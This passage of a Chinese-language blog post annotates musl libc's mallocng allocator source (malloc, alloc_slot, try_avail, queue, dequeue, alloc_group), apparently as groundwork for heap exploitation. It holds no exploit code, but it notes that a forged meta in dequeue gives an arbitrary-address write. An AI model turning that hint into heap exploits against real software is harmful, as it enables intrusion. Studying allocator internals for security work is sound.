class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据 n 取 size_classes 对应大小的下标</span></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">	rdlock();</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 寻找合适的 meta */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取对应大小的 meta</span></span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果没有对应的 meta，且 4 &lt;= sc &lt; 32 且 sc !=6 且 sc 为偶数 且对应大小的所有 chunk 数量为 0</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="comment">// 使用更大一点（sc+1）的 meta</span></span><br><span class="line">		<span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果 sc+1 对应的 meta 也不存在或存在但没有可用的 chunk 则 usage+3</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// 如果 usage &lt;= 12 则 sc+1</span></span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 寻找可分配的 chunk */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 取最低位的 1，即取可用的 idx 最小的 chunk，没有则为 0</span></span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">        <span class="comment">// 若无可用 chunk，则跳出循环</span></span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 若没有其他问题，则在 avail_mask 中将对应 chunk 的那一 bit 位置零</span></span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算出对应的 chunk idx</span></span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有合适的 chunk，则进一步分配，获取 chunk 下标</span></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 更新为即将使用的 meta</span></span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">    </span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>将 size 转化为对应的 size_classes 的下标 sc</li>
<li>取 ctx.active[sc] 第一个 meta，取其 avail_mask 中 idx 最小的 chunk</li>
<li>如果没有则进入 <code>alloc_slot</code> 做进一步分配</li>
</ol>
<h3 id="alloc-slot"><a href="#alloc-slot" class="headerlink" title="alloc_slot"></a>alloc_slot</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果链表中都没有可用的 chunk，则重新申请一个 group</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>进入 <code>try_avail</code> 尝试从 ctx.active[sc] 对应的 meta 链表中寻找可分配的 chunk</li>
<li>没有则进入 <code>alloc_group</code> 再申请一个 meta 和 group</li>
</ol>
<h3 id="try-avail"><a href="#try-avail" class="headerlink" title="try_avail"></a>try_avail</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">	<span class="type">uint32_t</span> first;</span><br><span class="line">	<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="comment">// 若没有可分配的 chunk</span></span><br><span class="line">	<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">            <span class="comment">/* 且也没有 freed chunk，即 group 中的 chunk 都是 inuse</span></span><br><span class="line"><span class="comment">               则将该 meta 从 ctx.active[sc] 和 双向链表中移除 */</span></span><br><span class="line">			dequeue(pm, m);</span><br><span class="line">			m = *pm;</span><br><span class="line">			<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 优先使用下一个 meta 的 freed_chunk</span></span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">		<span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 跳过所有 chunk 都是 freed_chunk 且可 free 的 meta，一般不会出现这个情况</span></span><br><span class="line">		<span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">			mask = m-&gt;freed_mask;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">		<span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">		<span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">		<span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">/* 总结起来就是，如果第一个 meta 的 chunk 都是 inuse，</span></span><br><span class="line"><span class="comment">		   且第二个 meta 的 freed_chunk 使用完了，才进入下面的操作</span></span><br><span class="line"><span class="comment">		   可能是什么特殊情况，正常不会出现这个情况*/</span></span><br><span class="line">		<span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">				m = m-&gt;next;</span><br><span class="line">				*pm = m;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">				<span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">				<span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">				<span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">				<span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">					cnt++;</span><br><span class="line">					span += size;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">					cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">				m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 将 freed_mask 转为 avail_mask</span></span><br><span class="line">		mask = activate_group(m);</span><br><span class="line">		assert(mask);</span><br><span class="line">		decay_bounces(m-&gt;sizeclass);</span><br><span class="line">	&#125;</span><br><span class="line">	first = mask&amp;-mask;</span><br><span class="line">	m-&gt;avail_mask = mask-first;</span><br><span class="line">	<span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>若 active 第一个 meta 的 chunk 都是 inuse，则将此 meta 从 active 和 链表中移出</li>
<li>将 active 第一个 meta 设置为下一个 meta</li>
<li>将其 freed_mask 转为 avail_mask 使用</li>
<li>取 avail_mask 中 idx 最小的 chunk</li>
</ol>
<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!m-&gt;next);</span><br><span class="line">	assert(!m-&gt;prev);</span><br><span class="line">	<span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">		m-&gt;next = head;</span><br><span class="line">		m-&gt;prev = head-&gt;prev;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		m-&gt;prev = m-&gt;next = m;</span><br><span class="line">		*phead = m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果能够伪造 meta，可以任意地址写</p>
<h3 id="alloc-group"><a href="#alloc-group" class="headerlink" title="alloc_group"></a>alloc_group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> meta *<span class="title function_">alloc_group</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line">    <span class="comment">// 优先寻找 freed_meta，将其从 ctx.free_meta_head 移除</span></span><br><span class="line">    <span class="comment">// 若没有就从 meta_area 中按地址从低到高顺序取一个</span></span><br><span class="line">    <span class="comment">// 如果 meta_area 满了，则再申请一个 meta_area</span></span><br><span class="line">    <span class="comment">// 会将 meta 的 prev，next 置零</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line">	<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">	<span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line">	<span class="type">int</span> active_idx;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 设置 cnt，也就是 group 能容纳 chunk 最大数量 */</span></span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">			i++;</span><br><span class="line">		cnt = small_cnt_tab[sc][i];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">		<span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">		<span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">		cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">		<span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">			cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">		<span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">		<span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">			cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line">	<span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line">	<span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line">	<span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line">	<span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">		<span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">		<span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">		<span class="type">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">		account_bounce(sc);</span><br><span class="line">		step_seq();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">		<span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">		<span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">		<span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">		<span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">		<span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">		<span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">size_t</span> needed = size*cnt + UNIT;</span><br><span class="line">		needed += -needed &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">		<span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">		<span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">		<span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">			req += IB + UNIT;</span><br><span class="line">			req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">				cnt = <span class="number">1</span>;</span><br><span class="line">				needed = req;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">			free_meta(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">int</span> j = size_to_class(UNIT+cnt*size-IB);</span><br><span class="line">        <span class="comment">// 从大 group 中申请小 group，大 group 的 chunk 作为整个小 group，是一个递归过程</span></span><br><span class="line">		<span class="type">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);</span><br><span class="line">		<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			free_meta(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">		p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">		m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">		p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">			p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">		active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 增加可用 chunk 个数</span></span><br><span class="line">	ctx.usage_by_class[sc] += cnt;</span><br><span class="line">    <span class="comment">// 初始化 meta 和 group</span></span><br><span class="line">	m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">	m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">	m-&gt;mem = (<span class="type">void</span> *)p;</span><br><span class="line">	m-&gt;mem-&gt;meta = m;</span><br><span class="line">    <span class="comment">// group 的 active_idx 和 meta 的 last_idx 一般是相等的，为 cnt-1</span></span><br><span class="line">	m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">	m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">	m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">	m-&gt;sizeclass = sc;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

